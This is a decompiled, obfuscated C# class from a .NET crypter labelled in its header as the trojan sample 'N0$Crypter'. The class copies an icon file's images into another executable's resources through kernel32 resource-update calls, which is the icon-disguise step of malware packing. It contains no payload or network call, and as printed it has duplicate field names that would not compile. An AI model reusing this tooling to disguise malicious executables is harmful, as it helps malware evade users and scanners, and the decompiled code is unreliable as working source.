// Decompiled with JetBrains decompiler
// Type: A.P
// Assembly: N0$Crypter, Version=3.0.7.1, Culture=neutral, PublicKeyToken=null
// MVID: FD276B3A-BCAA-4176-AE7A-13B114112E73
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.hae-91602cc2011b8768f677252d0fce055cd9e20323cd9c86736de5f27b67249290.exe

using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;

namespace A
{
  public sealed class P
  {
    public static void A(string _param0, string _param1) => P.B(_param0, _param1, 1U, 1U);

    public static void B(string _param0, string _param1, uint _param2, uint _param3)
    {
      P.O o = P.O.A(_param1);
      IntPtr num1 = P.J.A(_param0, false);
      byte[] numArray1 = o.A(_param3);
      IntPtr num2 = num1;
      IntPtr num3;
      XH.A(ref num3, 14L);
      IntPtr num4 = num3;
      IntPtr num5;
      XH.A(ref num5, (long) _param2);
      IntPtr num6 = num5;
      byte[] numArray2 = numArray1;
      int length1 = numArray1.Length;
      P.J.A(num2, num4, num6, (short) 0, numArray2, length1);
      int num7 = o.A() - 1;
      for (int index = 0; index <= num7; ++index)
      {
        byte[] numArray3 = o.A(index);
        IntPtr num8 = num1;
        XH.A(ref num5, 3L);
        IntPtr num9 = num5;
        XH.A(ref num3, (long) _param3 + (long) index);
        IntPtr num10 = num3;
        byte[] numArray4 = numArray3;
        int length2 = numArray3.Length;
        P.J.A(num8, num9, num10, (short) 0, numArray4, length2);
      }
label_3:
      switch (4)
      {
        case 0:
          goto label_3;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (P.B);
          }
          P.J.A(num1, false);
          break;
      }
    }

    [SuppressUnmanagedCodeSecurity]
    private sealed class J
    {
      [DllImport("kernel32", EntryPoint = "BeginUpdateResource")]
      public static extern IntPtr A(string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1);

      [DllImport("kernel32", EntryPoint = "UpdateResource")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool A(
        IntPtr _param0,
        IntPtr _param1,
        IntPtr _param2,
        short _param3,
        [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] _param4,
        int _param5);

      [DllImport("kernel32", EntryPoint = "EndUpdateResource")]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool A(IntPtr _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1);
    }

    private struct K
    {
      public ushort A;
      public ushort B;
      public ushort C;
    }

    private struct L
    {
      public byte A;
      public byte B;
      public byte C;
      public byte D;
      public ushort A;
      public ushort B;
      public int A;
      public int B;
    }

    private struct M
    {
      public uint A;
      public int A;
      public int B;
      public ushort A;
      public ushort B;
      public uint B;
      public uint C;
      public int C;
      public int D;
      public uint D;
      public uint E;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 2)]
    private struct N
    {
      public byte A;
      public byte B;
      public byte C;
      public byte D;
      public ushort A;
      public ushort B;
      public int A;
      public ushort C;
    }

    private sealed class O
    {
      private P.K A;
      private P.L[] A;
      private byte[][] A;

      private O() => this.A = new P.K();

      [SpecialName]
      public int A() => (int) this.A.C;

      [SpecialName]
      public byte[] A(int _param1) => this.A[_param1];

      public static P.O A(string _param0)
      {
        P.O o = new P.O();
        byte[] numArray = GI.A(_param0);
        GCHandle gcHandle = FI.A((object) numArray, GCHandleType.Pinned);
        // ISSUE: type reference
        o.A = (P.K) AI.A(CI.A(ref gcHandle), DD.A(__typeref (P.K)));
        o.A = new P.L[(int) o.A.C - 1 + 1];
        o.A = new byte[(int) o.A.C - 1 + 1][];
        int num1 = EI.A((object) o.A);
        // ISSUE: type reference
        Type type = DD.A(__typeref (P.L));
        int num2 = DI.A(type);
        int num3 = (int) o.A.C - 1;
        for (int index = 0; index <= num3; ++index)
        {
          IntPtr num4;
          ref IntPtr local = ref num4;
          IntPtr num5 = CI.A(ref gcHandle);
          long num6 = BI.A(ref num5) + (long) num1;
          XH.A(ref local, num6);
          P.L l = (P.L) AI.A(num4, type);
          o.A[index] = l;
          o.A[index] = new byte[l.A - 1 + 1];
          ZH.A((Array) numArray, l.B, (Array) o.A[index], 0, l.A);
          num1 += num2;
        }
label_3:
        switch (2)
        {
          case 0:
            goto label_3;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (P.O.A);
            }
            YH.A(ref gcHandle);
            return o;
        }
      }

      public byte[] A(uint _param1)
      {
        // ISSUE: type reference
        // ISSUE: type reference
        byte[] numArray = new byte[DI.A(DD.A(__typeref (P.K))) + DI.A(DD.A(__typeref (P.N))) * this.A() - 1 + 1];
        GCHandle gcHandle1 = FI.A((object) numArray, GCHandleType.Pinned);
        HI.A((object) this.A, CI.A(ref gcHandle1), false);
        int num1 = EI.A((object) this.A);
        int num2 = this.A() - 1;
        for (int index = 0; index <= num2; ++index)
        {
          P.N n = new P.N();
          P.M m = new P.M();
          GCHandle gcHandle2 = FI.A((object) m, GCHandleType.Pinned);
          // ISSUE: type reference
          II.A(this.A(index), 0, CI.A(ref gcHandle2), DI.A(DD.A(__typeref (P.M))));
          YH.A(ref gcHandle2);
          n.A = this.A[index].A;
          n.B = this.A[index].B;
          n.C = this.A[index].C;
          n.D = this.A[index].D;
          n.A = m.A;
          n.B = m.B;
          n.A = this.A[index].A;
          n.C = (ushort) ((ulong) _param1 + (ulong) index);
          // ISSUE: variable of a boxed type
          __Boxed<P.N> local1 = (ValueType) n;
          IntPtr num3;
          ref IntPtr local2 = ref num3;
          IntPtr num4 = CI.A(ref gcHandle1);
          long num5 = BI.A(ref num4) + (long) num1;
          XH.A(ref local2, num5);
          IntPtr num6 = num3;
          HI.A((object) local1, num6, false);
          // ISSUE: type reference
          num1 += DI.A(DD.A(__typeref (P.N)));
        }
label_3:
        switch (3)
        {
          case 0:
            goto label_3;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (P.O.A);
            }
            YH.A(ref gcHandle1);
            return numArray;
        }
      }
    }
  }
}
